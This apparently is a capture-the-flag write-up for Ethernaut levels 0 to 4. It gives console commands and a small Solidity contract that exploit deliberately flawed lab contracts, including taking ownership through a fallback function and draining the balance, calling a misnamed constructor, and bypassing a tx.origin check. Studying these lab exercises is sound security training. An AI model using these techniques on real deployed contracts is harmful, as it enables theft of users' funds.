## Ethernaut Level 0: Hello Ethernaut

## Commands Used

### 1. Called info() to get the initial clue
```
await contract.info()
```
**Output:**  
`"You will find what you need in info1()."`

This was the first hint given in the level.

---

### 2. Inspected the contract object
```
await contract
```
To check what functions are available in the contract. I noticed a password() function.

---

### 3. Retrieved the password
```
await contract.password()
```
**Output:**  
`"ethernaut0"`

This is the password needed for authentication.

---

### 4. Submitted the password directly
```
await contract.authenticate(await contract.password())
```
**Output:**  
Transaction successful

### 5. Clicked "Submit Instance"  
Level completed 

## Output Proof
![Level Complete Output](assets/Hello_Ethernaut.png)
![2](assets/Hello_Ethernaut(1).png)


# Ethernaut Level 1: Fallback

##  Strategy

The fallback function in this contract sets msg.sender as the new owner only if:
1. The caller sends ETH to the contract and
2. The caller has already contributed some ether via the contribute() function.

Also, the initial owner starts with `1000 ether` in contributions, so our total contribution must exceed that to trigger ownership update via contribute(). 

---

## Commands Used

### 1. Contributed a small amount to initialize `contributions[msg.sender] > 0`
```
await contract.contribute({value: toWei("0.0005")})
```
Enables the fallback function condition `contributions[msg.sender] > 0`.

---

### 2. Sent ETH directly to the contract to trigger the fallback function
```
await web3.eth.sendTransaction({from: player, to: contract.address, value: web3.utils.toWei("0.0001", "ether")})
```
This calls the `receive()` function, which sets me as the new `owner` since I already had a contribution.

---

### 3. Called `withdraw()` to drain the balance
```
await contract.withdraw()
```
Now that I’m the owner, I can withdraw the contract’s balance and fulfill the final objective.

---

### 4. Level completed

![Level Complete Output](assets/Fallback.png)


# Ethernaut Level 2: Fallout

## Strategy

- **Vulnerability**: The constructor in this contract is incorrectly named `Fal1out`. In Solidity versions prior to 0.7.0, the constructor should match the contract's name.
- **Exploit**: Since `Fal1out()` is a public function , anyone can call it. By calling `Fal1out()`, I was able to set myself as the contract's owner.

---

## Commands Used

### 1. Called the misnamed constructor to claim ownership
```
await contract.Fal1out()
```
This allowed me to set myself as the owner of the contract, as it was not treated as a constructor but a regular public function.

---

### 2. Verified ownership
```
await contract.owner()
```
I got my address as the output, confirming that I am now the owner of the contract

To check that I successfully became the owner after calling `Fal1out()`.

---

## Level completed

![Level Complete Output](assets/Fallout.png)


# Ethernaut Level 3: Coin Flip

## Strategy

In this challenge, the `CoinFlip` contract simulates a coin flip by using the previous block's hash, which is not truly random. This hash can be predicted using the `blockhash()` function, making it possible to determine the outcome of the coin flip in advance.

---

## Commands Used

### 1. Get the contract instance address
```
await contract.address
```
This command was used to get the address of the deployed `CoinFlip` contract

---

### 2. Query the `consecutiveWins` after each successful guess
```
await contract.consecutiveWins()
```
I used this command 10 times to check the `consecutiveWins` value after each flip. Each time the guess was correct, the value increased, and I confirmed that the counter reached 10.

---

## Level completed
![Level Complete Output](assets/Coin_Flip.png)
![2](assets/Coin_Flip(1).png)


# Ethernaut Level 4: Telephone

## Strategy

In this challenge, the `Telephone` contract has a function `changeOwner()` that allows the owner to be changed under certain conditions. The key condition here is that the contract checks whether the transaction origin (`tx.origin`) is different from the caller's address (`msg.sender`). This check is the key vulnerability, as it allows an attacker to use an intermediate contract to manipulate the `tx.origin` value and bypass the owner check.

### Steps:
1. **Understanding the Vulnerability**: The `tx.origin` is the address that initiated the transaction, and it will be different from the contract address when the contract is called by another contract. This condition allows the ownership to be transferred by a contract calling the `changeOwner()` function.
2. **Exploiting the Vulnerability**: I wrote an intermediate contract that calls the `changeOwner()` function of the target `Telephone` contract, passing the contract’s address (`msg.sender`) to satisfy the condition and change the owner of the `Telephone` contract.

---

## Commands Used

### 1. Creating an Interface to Interact with the `Telephone` Contract
```
interface ITelephone {
  function changeOwner(address _owner) external;
}
```
I created an interface (`ITelephone`) to interact with the `Telephone` contract. This allows me to call the `changeOwner()` function on the contract from another contract.

---

### 2. Intermediate Contract to Exploit the Vulnerability
```
contract IntermediateContract {
  function changeOwner(address _addr) public {
    ITelephone(_addr).changeOwner(msg.sender);
  }
}
```
This contract acts as an intermediary. It calls the `changeOwner()` function of the target `Telephone` contract, passing the caller's address (`msg.sender`) as the new owner. Since the check `tx.origin != msg.sender` is bypassed, the ownership is transferred successfully.

---

### Explanation of the Exploit:
- The `Telephone` contract uses `tx.origin` to restrict who can change the owner. `tx.origin` refers to the original address that initiated the transaction, and in this case, it checks if the transaction origin is not the same as the caller.
- By using an intermediate contract, I bypassed this check because `msg.sender` (the contract address) is different from `tx.origin` (my address). The intermediate contract successfully called the `changeOwner()` function, transferring the ownership of the `Telephone` contract to my address.

### 3. Executing in Remix IDE
After deploying both the `Telephone` contract and the `IntermediateContract` on Remix IDE, I called the `changeOwner()` function on the intermediate contract to transfer ownership of the `Telephone` contract to my address.

---

### 4. **Query the ownership to confirm the change:**

```
await contract.owner()
```

## Level completed
![Level Complete Output](assets/Telephone.png)
